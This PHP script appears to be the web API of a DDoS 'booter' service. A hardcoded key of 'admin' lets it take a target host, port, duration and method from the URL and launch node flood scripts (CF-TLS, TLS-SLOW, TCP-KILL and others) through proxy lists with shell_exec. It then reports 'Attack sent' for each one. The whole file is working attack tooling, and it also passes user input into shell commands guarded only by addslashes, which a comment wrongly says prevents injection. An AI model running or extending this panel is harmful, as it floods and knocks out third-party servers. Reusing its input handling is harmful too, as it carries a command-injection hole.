<?php
// Coded by Sword

// Kiểm tra xem có lỗi khi lấy dữ liệu từ query string không
function checkInput($input) {
    return isset($_GET[$input]) ? $_GET[$input] : null;
}

$key = checkInput('key');
$host = checkInput('host');
$port = checkInput('port');
$time = checkInput('time');
$method = checkInput('method');

// Sử dụng hàm addslashes để tránh SQL injection khi sử dụng biến trong shell_exec
$host = addslashes($host);
$port = addslashes($port);
$time = addslashes($time);
$method = addslashes($method);

if ($key == "admin") {
    if ($host == null) { echo "Please enter a host"; }
    elseif ($port == null) { echo "Please enter a port"; }
    elseif ($time == null) { echo "Please enter a time"; }
    elseif ($method == null) { echo "Please enter a method"; }
    else {
        if ($method == "CF-TLS") {
            shell_exec("node CF-TLS.js $host $time 30 proxy.txt");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "HTTP-FIVEM") { 
            shell_exec("node HTTP-FIVEM.js $host $time 30 100 proxy.txt");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TDD-SKYLE") { 
            shell_exec("node TDD-SKYLE.js $host $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TLS-SUPER") { 
            shell_exec("node TLS-SUPER.js $host $time 60 30 proxy.txt");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TLS-SLOW") { 
            shell_exec("node TLS-SLOW.js $host $time 30 100 proxy.txt GET");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TLS-MMB") { 
            shell_exec("node TLS-MMB.js $host $time 60 30");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TCP") { 
            shell_exec("node TCP-KILL.js byte $host:$port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "HTTP-MIX") { 
            shell_exec("node HTTP-MIX.js $host $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        else {
            echo "Invalid method!";
        }
    }
}
else { 
    echo "Key invalid !";
}
?>
